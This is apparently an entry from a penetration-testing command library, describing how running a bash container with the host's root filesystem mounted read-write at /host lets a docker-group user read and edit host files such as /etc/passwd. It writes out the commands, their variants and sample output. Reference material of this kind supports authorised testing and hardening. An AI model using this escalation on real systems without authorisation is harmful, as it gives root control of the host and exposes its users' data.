---
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
name: docker-run-bash-with-host-root-mount
type: command
executor: bash
data: 'docker run -it -v /:/host bash'
output: null
created_at: '2023-04-06T03:56:19.469011+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - docker
  - privilege-escalation
verified: true
validated: true
---

# docker-run-bash-with-host-root-mount

## Command

```bash
docker run -it -v /:/host bash
```

## Description

Runs a bash container with the host's root filesystem mounted read-write at /host inside the container. This provides root-level access to host files from the container's root context, enabling privilege escalation techniques like editing /etc/passwd.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -it | Interactive mode with TTY | Yes |
| -v /:/host | Mount host root at /host in container | Yes |
| bash | Image name (uses busybox/bash if available) | Yes |

## Examples

### Basic Usage

```bash
docker run -it -v /:/host bash
```

Once inside: `ls /host/etc` to browse host files.

### With Cleanup

```bash
docker run --rm -it -v /:/host bash
```

## Expected Output

Container starts with:

```
root@container:/# ls /host
bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
boot  etc  initrd.img  lib  media  root  sbin  sys  usr
```

Success: Ability to read/write host files, e.g., `cat /host/etc/passwd` lists host users.

## Related

- [[procedures/Linux-Docker-Privilege-Escalation]]
- [[tools/Docker]]
